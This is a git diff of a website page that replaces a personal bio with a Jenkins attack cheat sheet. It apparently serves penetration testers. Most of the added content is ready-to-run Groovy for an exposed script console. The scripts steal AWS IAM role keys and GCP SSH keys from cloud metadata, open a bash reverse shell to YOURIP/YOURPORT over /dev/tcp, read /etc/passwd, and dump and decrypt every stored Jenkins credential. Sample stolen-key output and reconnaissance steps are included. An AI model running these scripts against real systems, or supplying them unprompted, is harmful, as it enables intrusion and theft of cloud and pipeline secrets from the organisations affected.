@@ -4,22 +4,121 @@ layout: default
 permalink: /jenkins/
 ---
 
-<div class="home">
+<div class="wrapper">
   <div class="page-heading">
-    <h2 class="page-title">Jenkins</h2>
+    <h1 class="page-title">jenkins</h1>
+    <p class="page-intro">Groovy script console commands for exploiting an exposed Jenkins instance, from cloud credential theft to reverse shells.</p>
   </div>
-  <div class="about">
-    <div class="container-face">
-      <img class="face" src="{{site.baseurl}}/assets/img/{% if site.pic %}{{ site.pic }}{% else %}github.jpg{% endif %}" alt="">
-    </div>
-    <h2 class="tagline">{% if site.tagline %}{{site.tagline}}{% else %}{% endif %}</h2>
-    <div class="about-description">
-      <p>if you find that /scripts is unprotected then here is some commands you could run to have fun.</p>
-    </div>
-    <div class="contact-contaiver">
-      <ul class="contact-list">
-  <script src="https://gist.github.com/random-robbie/f47039501f8df000a4ff7353f3a05848.js"></script>
-          </ul>
-    </div>
+
+  <div class="post-content" style="max-width: 860px;">
+    <h2>$ Finding the script console</h2>
+    <p>The Groovy script console is commonly left unauthenticated on misconfigured Jenkins instances. Check these endpoints without credentials:</p>
+    <pre><code>/script
+/script/
+/whoAmI
+/systemInfo
+/credentials/
+/asynchPeople/</code></pre>
+    <p>A quick unauthenticated check:</p>
+    <pre><code>curl -s -o /dev/null -w "%{http_code}" http://jenkins.example.com/script
+# 200 means the script console is open; 403 means it requires auth</code></pre>
+    <p>If <code>/whoAmI</code> reports <code>anonymous</code> with overall/admin privileges, you have full Groovy execution.</p>
+
+    <h2>$ AWS IAM role keys</h2>
+    <p>Fetch the instance metadata to dump temporary IAM credentials attached to the Jenkins host:</p>
+    <pre><code>def command = "wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+def proc = command.execute()
+proc.waitFor()
+
+def command2 = "wget -q -O - http://169.254.169.254/latest/meta-data/iam/security-credentials/${proc.in.text}/"
+def proc2 = command2.execute()
+proc2.waitFor()
+
+println "Process exit code: ${proc2.exitValue()}"
+println "Std Err: ${proc2.err.text}"
+println "Std Out: ${proc2.in.text}"</code></pre>
+    <p>This should print the IAM role keys:</p>
+    <pre><code>Process exit code: 0
+Std Err:
+Std Out: {
+  "Code" : "Success",
+  "LastUpdated" : "2018-10-08T15:36:01Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIAXASDASDADSSAD7",
+  "SecretAccessKey" : "iSnUqdsffsdfssfdfdsdfdsfNXutY",
+  "Token" : "9QNiu+O/+kh6PvtfkDeh47h5eqvIGyiQ6HE+HqmgHtXRgXfdqduR5MdYOo9AzUsdffffffffffLQn6qzPj2sm7anG1v/S4EgP/sdrDOyHk9xeXV58o9PLt3QU=",
+  "Expiration" : "2018-10-08T21:53:19Z"
+}</code></pre>
+
+    <h2>$ Reverse shell</h2>
+    <p>Change YOURIP for your IP and YOURPORT for your port. Ensure you have netcat running for the connect back:</p>
+    <pre><code>def command = "bash -i >& /dev/tcp/YOURIP/YOURPORT 0>&1"
+def proc = command.execute()
+proc.waitFor()
+
+println "Process exit code: ${proc.exitValue()}"
+println "Std Err: ${proc.err.text}"
+println "Std Out: ${proc.in.text}"</code></pre>
+
+    <h2>$ Google metadata public SSH keys</h2>
+    <pre><code>def command = "curl http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"
+def proc = command.execute()
+proc.waitFor()
+
+println "Process exit code: ${proc.exitValue()}"
+println "Std Err: ${proc.err.text}"
+println "Std Out: ${proc.in.text}"</code></pre>
+
+    <h2>$ Print environment — handy to see if it's a container</h2>
+    <pre><code>def command = "printenv"
+def proc = command.execute()
+proc.waitFor()
+
+println "Process exit code: ${proc.exitValue()}"
+println "Std Err: ${proc.err.text}"
+println "Std Out: ${proc.in.text}"</code></pre>
+
+    <h2>$ Groovy one-liners without the shell</h2>
+    <p>You can run commands directly from the console without a full script wrapper:</p>
+    <pre><code>"id".execute().text
+# or with a shell, for pipes and redirection:
+["bash", "-c", "cat /etc/passwd | grep -v nologin"].execute().text</code></pre>
+    <p>Anything returned from <code>.text</code> prints directly in the console output.</p>
+
+    <h2>$ Dump stored credentials</h2>
+    <p>Jenkins stores credentials (API tokens, SSH keys, cloud keys) in its credential store. Retrieve and decrypt them all with:</p>
+    <pre><code>import com.cloudbees.plugins.credentials.*
+import com.cloudbees.plugins.credentials.impl.*
+import com.cloudbees.plugins.credentials.domains.*
+import com.cloudbees.plugins.credentials.common.*
+
+def creds = CredentialsProvider.lookupCredentials(
+    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
+    Jenkins.instance, null, null)
+
+creds.each {
+  println "${it.id} : ${it.username} : ${it.password ?: it.privateKey}"
+}</code></pre>
+    <p>Secrets stored with the <code>Secret Text</code> type can be revealed with <code>it.secret.getPlainText()</code>. The browsing UI at <code>/credentials/</code> also lists what exists even when it does not show the values.</p>
+
+    <h2>$ Useful information gathering via the script console</h2>
+    <p>Enumerate jobs, users, and system details without touching the shell:</p>
+    <pre><code># List all jobs and their build status
+Jenkins.instance.getAllItems(hudson.model.Job.class).each {
+  println "${it.fullName} : ${it.buildHealth.healthScore}"
+}
+
+# List all users
+Jenkins.instance.getAllItems(hudson.model.User.class).each { println it.id }
+
+# Confirm the JVM and environment Jenkins is running in
+println System.getProperty("os.name") + " " + System.getProperty("os.version")
+println System.getenv("HOSTNAME")</code></pre>
+
+    <h2>$ Checking the anonymous read misconfiguration</h2>
+    <p>Two separate issues commonly expose a Jenkins instance: anonymous script console access and anonymous read access. Check both:</p>
+    <pre><code>curl -s http://jenkins.example.com/api/json?tree=jobs[name] | head -c 500
+curl -s http://jenkins.example.com/whoAmI</code></pre>
+    <p>If the API returns job names, anonymous read is enabled. Job configs at <code>/job/&lt;name&gt;/config.xml</code> may then leak build steps containing hardcoded secrets. Environments listing build parameters at <code>/job/&lt;name&gt;/env-vars.html</code> can leak internal hostnames and tokens.</p>
   </div>
 </div>
